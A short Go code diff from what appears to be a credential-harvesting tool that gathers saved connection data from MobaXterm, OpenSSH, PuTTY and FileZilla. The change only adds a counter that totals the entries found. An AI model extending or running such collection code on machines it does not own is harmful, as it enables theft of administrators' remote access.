@@ -77,6 +77,7 @@ type SysadminData struct {
 	OpenSsh   types.OpensshData     `json:"open_ssh"`
 	Putty     []types.PuttyData     `json:"putty"`
 	Filezilla []types.FileZillaData `json:"filezilla"`
+	Count     int                   `json:"count"`
 }
 
 func ExtractSysadminData() SysadminData {
@@ -86,21 +87,26 @@ func ExtractSysadminData() SysadminData {
 	openssh, errOpenSsh := sysadmin.OpensshExtractDataRun()
 	putty, errPutty := sysadmin.PuttyExtractDataRun()
 	filezilla, errFileZilla := sysadmin.FilezillaExtractDataRun()
+	outdata.Count = 0
 
 	if errExtractMobaData == nil {
 		outdata.MobaXTerm = mobaData
+		outdata.Count += len(mobaData)
 	}
 
 	if errOpenSsh == nil {
 		outdata.OpenSsh = openssh
+		outdata.Count += len(openssh.Hosts)
 	}
 
 	if errPutty == nil {
 		outdata.Putty = putty
+		outdata.Count += len(putty)
 	}
 
 	if errFileZilla == nil {
 		outdata.Filezilla = filezilla
+		outdata.Count += len(filezilla)
 	}
 
 	return outdata
